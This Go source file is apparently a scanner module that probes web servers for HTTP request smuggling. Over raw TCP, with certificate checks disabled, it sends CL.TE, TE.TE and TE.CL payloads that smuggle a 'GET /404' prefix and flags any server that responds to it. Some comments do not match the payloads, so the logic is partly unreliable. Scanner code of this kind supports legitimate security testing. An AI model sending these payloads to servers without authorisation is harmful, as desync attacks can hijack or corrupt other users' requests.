package modules

import (
	"github.com/SentinelXofficial/sxel/pkg/core"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// ScanSmuggling tests for HTTP request smuggling via CL.TE and TE.CL desync.
// This uses raw TCP connections because the Go http.Client normalises
// Transfer-Encoding and Content-Length automatically.
func ScanSmuggling(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	host := parsed.Host
	if !strings.Contains(host, ":") {
		if parsed.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	fmt.Printf("  \033[36m[smuggling] probing %s (%s)\033[0m\n", target.URL, host)

	// ── 1. CL.TE desync ──────────────────────────────────────────────────
	if res := testCLTE(client, cfg, host, target.URL, parsed); res != nil {
		results = append(results, *res)
	}

	// ── 2. TE.CL desync ──────────────────────────────────────────────────
	if res := testTECL(client, cfg, host, target.URL, parsed); res != nil {
		results = append(results, *res)
	}

	// ── 3. TE.TE confusion ──────────────────────────────────────────────
	if res := testTETE(client, cfg, host, target.URL, parsed); res != nil {
		results = append(results, *res)
	}

	return results
}

// smuggledDial connects to host via raw TCP (with TLS if needed).
func smuggledDial(host string, tlsConfig *tls.Config, timeout time.Duration) (net.Conn, error) {
	dialer := net.Dialer{Timeout: timeout}
	if strings.Contains(host, ":443") || tlsConfig != nil {
		conn, err := tls.DialWithDialer(&dialer, "tcp", host, tlsConfig)
		return conn, err
	}
	return dialer.Dial("tcp", host)
}

// smuggledRequest sends raw HTTP bytes and returns the full response.
func smuggledRequest(host, targetURL string, tlsConfig *tls.Config, rawBytes []byte, timeout time.Duration) (string, error) {
	conn, err := smuggledDial(host, tlsConfig, timeout)
	if err != nil {
		return "", err
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(timeout))
	if _, err := conn.Write(rawBytes); err != nil {
		return "", err
	}

	var resp bytesBuf
	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			resp.Write(buf[:n])
		}
		if err != nil {
			break
		}
	}
	return resp.String(), nil
}

type bytesBuf struct {
	bytes []byte
}

func (b *bytesBuf) Write(p []byte) (int, error) {
	b.bytes = append(b.bytes, p...)
	return len(p), nil
}

func (b *bytesBuf) String() string {
	return string(b.bytes)
}

// testCLTE sends a CL.TE smuggling probe where the front-end uses Content-Length
// and the back-end uses Transfer-Encoding.
func testCLTE(client *http.Client, cfg *core.Config, host, targetURL string, parsed *url.URL) *core.ScanResult {
	// Build the smuggle prefix: CL=6, body "0\r\n\r\nG" which the TE back-end
	// treats as chunk terminator + prefix of next request
	smugglePrefix := "0\r\n\r\nG"

	body := smugglePrefix + "GET /404 HTTP/1.1\r\nX-Smuggled: sxsc\r\n\r\n"

	raw := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n%s",
		parsed.RequestURI(), parsed.Host, cfg.UserAgent, len(smugglePrefix), body)

	tlsCfg := &tls.Config{InsecureSkipVerify: true} //nolint:gosec
	if parsed.Scheme != "https" {
		tlsCfg = nil
	}

	resp1, err := smuggledRequest(host, targetURL, tlsCfg, []byte(raw), time.Duration(cfg.Timeout)*time.Second)
	if err != nil {
		if cfg.Verbose {
			fmt.Printf("    \033[90m[smuggling] CL.TE probe failed: %v\033[0m\n", err)
		}
		return nil
	}

	// If we see a 404 or our smuggled header in the response, the desync worked
	// (either immediately or on the next legitimate request)
	if strings.Contains(resp1, "HTTP/1.1 404") || strings.Contains(resp1, "X-Smuggled") {
		return &core.ScanResult{
			Type:      "HTTP Request Smuggling — CL.TE Desync",
			URL:       targetURL,
			Method:    "POST (raw TCP)",
			Parameter: "Transfer-Encoding / Content-Length",
			Payload:   "CL.TE: CL=" + fmt.Sprintf("%d", len(smugglePrefix)) + " TE=chunked",
			Severity:  "CRITICAL",
			Evidence:  "Server exhibits CL.TE desynchronisation — smuggled request prefix processed by back-end",
			Timestamp: time.Now(),
		}
	}
	return nil
}

// testTECL sends a TE.CL smuggling probe.
func testTECL(client *http.Client, cfg *core.Config, host, targetURL string, parsed *url.URL) *core.ScanResult {
	smuggleBody := "GPOST /404 HTTP/1.1\r\nX-Smuggled: sxsc\r\nContent-Length: 0\r\n\r\n"

	// TE header says chunked, CL says full length, but the prefix "0\r\n\r\n"
	// terminates the chunked body early with the "GP" leftover as the next request prefix
	raw := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: close\r\n\r\n%x\r\n%s\r\n0\r\n\r\n",
		parsed.RequestURI(), parsed.Host, cfg.UserAgent, len(smuggleBody)-2, smuggleBody)

	tlsCfg := &tls.Config{InsecureSkipVerify: true} //nolint:gosec
	if parsed.Scheme != "https" {
		tlsCfg = nil
	}

	resp1, err := smuggledRequest(host, targetURL, tlsCfg, []byte(raw), time.Duration(cfg.Timeout)*time.Second)
	if err != nil {
		if cfg.Verbose {
			fmt.Printf("    \033[90m[smuggling] TE.CL probe failed: %v\033[0m\n", err)
		}
		return nil
	}

	if strings.Contains(resp1, "HTTP/1.1 404") || strings.Contains(resp1, "X-Smuggled") {
		return &core.ScanResult{
			Type:      "HTTP Request Smuggling — TE.CL Desync",
			URL:       targetURL,
			Method:    "POST (raw TCP)",
			Parameter: "Transfer-Encoding / Content-Length",
			Payload:   "TE.CL: TE=chunked CL=4",
			Severity:  "CRITICAL",
			Evidence:  "Server exhibits TE.CL desynchronisation — smuggled request prefix processed by back-end",
			Timestamp: time.Now(),
		}
	}
	return nil
}

// testTETE sends a TE.TE confusion probe where the Transfer-Encoding header
// is obfuscated so one server parses it but the other doesn't.
func testTETE(client *http.Client, cfg *core.Config, host, targetURL string, parsed *url.URL) *core.ScanResult {
	smuggleBody := "0\r\n\r\nG"

	raw := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: identity\r\nConnection: close\r\n\r\n%sGET /404 HTTP/1.1\r\nX-Smuggled: sxsc\r\n\r\n",
		parsed.RequestURI(), parsed.Host, cfg.UserAgent, smuggleBody)

	tlsCfg := &tls.Config{InsecureSkipVerify: true} //nolint:gosec
	if parsed.Scheme != "https" {
		tlsCfg = nil
	}

	resp1, err := smuggledRequest(host, targetURL, tlsCfg, []byte(raw), time.Duration(cfg.Timeout)*time.Second)
	if err != nil {
		return nil
	}

	if strings.Contains(resp1, "HTTP/1.1 404") || strings.Contains(resp1, "X-Smuggled") {
		return &core.ScanResult{
			Type:      "HTTP Request Smuggling — TE.TE Confusion",
			URL:       targetURL,
			Method:    "POST (raw TCP)",
			Parameter: "Transfer-Encoding (obfuscation)",
			Payload:   "TE.TE: chunked + identity obfuscation",
			Severity:  "CRITICAL",
			Evidence:  "Server exhibits TE.TE confusion — smuggled request processed by one layer but not the other",
			Timestamp: time.Now(),
		}
	}
	return nil
}
